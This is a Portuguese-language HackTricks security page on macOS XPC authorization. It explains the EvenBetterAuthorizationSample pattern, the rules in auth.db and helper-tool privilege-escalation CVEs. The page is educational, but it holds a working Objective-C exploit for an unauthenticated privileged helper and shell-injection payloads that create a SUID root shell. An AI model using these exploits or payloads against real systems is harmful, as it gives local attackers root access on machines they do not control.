# macOS XPC Autorização

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorização XPC

A Apple também propõe outra forma de autenticar se o processo que está se conectando tiver **permissões para chamar um método XPC exposto**.

Quando um aplicativo precisa **executar ações como um usuário privilegiado**, em vez de executar o app como um usuário privilegiado ele normalmente instala como root um HelperTool como um serviço XPC que pode ser chamado pelo app para realizar essas ações. No entanto, o app que chama o serviço deve ter autorização suficiente.

### ShouldAcceptNewConnection sempre YES

Um exemplo pode ser encontrado em [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Em `App/AppDelegate.m` ele tenta **conectar-se** ao **HelperTool**. E em `HelperTool/HelperTool.m` a função **`shouldAcceptNewConnection`** **não verifica** nenhum dos requisitos indicados anteriormente. Ela sempre retorna YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para mais informações sobre como configurar corretamente esta verificação:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Direitos da aplicação

No entanto, há alguma **autorização ocorrendo quando um método do HelperTool é chamado**.

A função **`applicationDidFinishLaunching`** de `App/AppDelegate.m` criará uma referência de autorização vazia depois que o app for iniciado. Isso deve sempre funcionar.\
Em seguida, ela tentará **adicionar alguns direitos** a essa referência de autorização chamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
A função `setupAuthorizationRights` de `Common/Common.m` irá armazenar no banco de autenticação `/var/db/auth.db` os direitos da aplicação. Observe como ela só adicionará os direitos que ainda não estão no banco de dados:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
A função `enumerateRightsUsingBlock` é a que é usada para obter permissões de aplicações, que são definidas em `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Isto significa que, ao final deste processo, as permissões declaradas dentro de `commandInfo` serão armazenadas em `/var/db/auth.db`. Note como ali você pode encontrar para **cada método** que **requer autenticação**, **nome da permissão** e o **`kCommandKeyAuthRightDefault`**. Este último **indica quem pode obter esse direito**.

Existem diferentes escopos para indicar quem pode acessar um direito. Alguns deles estão definidos em [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (você pode encontrar [todos eles aqui](https://www.dssw.co.uk/reference/authorization-rights/)), mas como resumo:

<table><thead><tr><th width="284.3333333333333">Nome</th><th width="165">Value</th><th>Descrição</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Qualquer pessoa</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ninguém</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>O usuário atual precisa ser administrador (estar no grupo de administradores)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Pedir para o usuário se autenticar.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Pedir para o usuário se autenticar. O usuário precisa ser administrador (estar no grupo de administradores)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especificar regras</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especificar comentários adicionais sobre o direito</td></tr></tbody></table>

### Verificação de Direitos

Em `HelperTool/HelperTool.m` a função **`readLicenseKeyAuthorization`** verifica se o caller está autorizado a **executar tal método** chamando a função **`checkAuthorization`**. Esta função irá checar se os **authData** enviados pelo processo chamador têm um **formato correto** e então irá verificar **o que é necessário para obter o direito** de chamar o método específico. Se tudo correr bem o **`error` retornado será `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Observe que, para **verificar os requisitos para obter o direito** de chamar esse método, a função `authorizationRightForCommand` irá apenas verificar o objeto mencionado anteriormente **`commandInfo`**. Em seguida, ela chamará **`AuthorizationCopyRights`** para verificar **se possui os direitos** para chamar a função (observe que as flags permitem interação com o usuário).

Neste caso, para chamar a função `readLicenseKeyAuthorization` o `kCommandKeyAuthRightDefault` está definido para `@kAuthorizationRuleClassAllow`. Então **qualquer pessoa pode chamá-la**.

### Informações do DB

Foi mencionado que essa informação é armazenada em `/var/db/auth.db`. Você pode listar todas as regras armazenadas com:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Então, você pode verificar quem pode acessar esse direito com:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Direitos permissivos

Você pode encontrar **todas as configurações de permissões** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), mas as combinações que não exigirão interação do usuário seriam:

1. **'authenticate-user': 'false'**
- Esta é a chave mais direta. Se definida como `false`, especifica que um usuário não precisa fornecer autenticação para obter esse direito.
- Isso é usado em **combinação com uma das 2 abaixo ou indicando um grupo** ao qual o usuário deve pertencer.
2. **'allow-root': 'true'**
- Se um usuário estiver operando como root (que tem permissões elevadas), e essa chave estiver definida como `true`, o usuário root poderia potencialmente obter esse direito sem autenticação adicional. Contudo, tipicamente, atingir o status de root já requer autenticação, então isso não é um cenário de "sem autenticação" para a maioria dos usuários.
3. **'session-owner': 'true'**
- Se definido como `true`, o proprietário da sessão (o usuário atualmente logado) receberia automaticamente esse direito. Isso pode ignorar autenticação adicional se o usuário já estiver logado.
4. **'shared': 'true'**
- Essa chave não concede direitos sem autenticação. Em vez disso, se definida como `true`, significa que uma vez que o direito tenha sido autenticado, ele pode ser compartilhado entre vários processos sem que cada um precise reautenticar. Mas a concessão inicial do direito ainda exigiria autenticação, a menos que combinada com outras chaves como `'authenticate-user': 'false'`.

Você pode [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obter os direitos interessantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Estudos de Caso de Authorization Bypass

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: O serviço Mach privilegiado `com.acustica.HelperTool` aceita qualquer conexão e sua rotina `checkAuthorization:` chama `AuthorizationCopyRights(NULL, …)`, então qualquer 32‑byte blob passa. `executeCommand:authorization:withReply:` então alimenta strings separadas por vírgula controladas pelo atacante em `NSTask` como root, criando payloads tais como:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
criar trivialmente um SUID root shell. Detalhes em [este write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: O listener sempre retorna YES e o mesmo padrão NULL `AuthorizationCopyRights` aparece em `checkAuthorization:`. O método `exchangeAppWithReply:` concatena a entrada do atacante em uma string para `system()` duas vezes, portanto injetar metacaracteres de shell em `appPath` (ex.: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) resulta em execução de código como root via o Mach service `com.plugin-alliance.pa-installationhelper`. Mais informações [aqui](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Executar uma auditoria grava `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expõe o Mach service `com.jamf.complianceeditor.helper` e exporta `-executeScriptAt:arguments:then:` sem verificar o `AuthorizationExternalForm` do chamador ou a assinatura de código. Um exploit trivial chama `AuthorizationCreate` para obter uma referência vazia, conecta-se com `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca o método para executar binários arbitrários como root. Notas completas de reversing (mais PoC) e PoC estão no write-up de Mykola Grymalyuk em [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 e 7.4.0–7.4.2 aceitavam mensagens XPC forjadas que alcançavam um helper privilegiado sem gates de autorização. Como o helper confiava no seu próprio `AuthorizationRef` privilegiado, qualquer usuário local capaz de enviar mensagens ao serviço podia forçá-lo a executar alterações de configuração arbitrárias ou comandos como root. Detalhes no resumo do advisory da SentinelOne (https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Dicas rápidas de triagem

- Quando um app distribui tanto uma GUI quanto um helper, compare (diff) os seus code requirements e verifique se `shouldAcceptNewConnection` trava o listener com `-setCodeSigningRequirement:` (ou valida `SecCodeCopySigningInformation`). Checagens ausentes normalmente resultam em cenários CWE-863 como no caso Jamf. Um olhar rápido parece:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compare o que o helper *acha* que está autorizando com o que o cliente fornece. Ao reverter, pare em `AuthorizationCopyRights` e confirme que o `AuthorizationRef` se origina de `AuthorizationCreateFromExternalForm` (fornecido pelo cliente) em vez do próprio contexto privilegiado do helper; caso contrário, provavelmente você encontrou um padrão CWE-863 similar aos casos acima.

## Revertendo a Autorização

### Verificando se EvenBetterAuthorization é usado

Se encontrar a função: **`[HelperTool checkAuthorization:command:]`** provavelmente o processo está usando o esquema de autorização mencionado anteriormente:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Além disso, se essa função estiver chamando funções como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, está usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Verifique o **`/var/db/auth.db`** para ver se é possível obter permissões para chamar alguma ação privilegiada sem interação do usuário.

### Comunicação de Protocolo

Então, você precisa encontrar o esquema do protocolo para poder estabelecer comunicação com o serviço XPC.

A função **`shouldAcceptNewConnection`** indica o protocolo que está sendo exportado:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Neste caso, temos o mesmo que em EvenBetterAuthorizationSample, [**veja esta linha**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Sabendo o nome do protocolo usado, é possível fazer dump da definição do seu header com:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por fim, só precisamos saber o **nome do Mach Service exposto** para estabelecer comunicação com ele. Há várias maneiras de encontrar isso:

- Em **`[HelperTool init]`** onde você pode ver o Mach Service sendo usado:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- No launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exemplo de Exploit

Neste exemplo é criado:

- A definição do protocolo com as funções
- Um auth vazio para solicitar acesso
- Uma conexão com o serviço XPC
- Uma chamada para a função se a conexão for bem-sucedida
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Outros auxiliares de privilégio XPC abusados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Referências

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
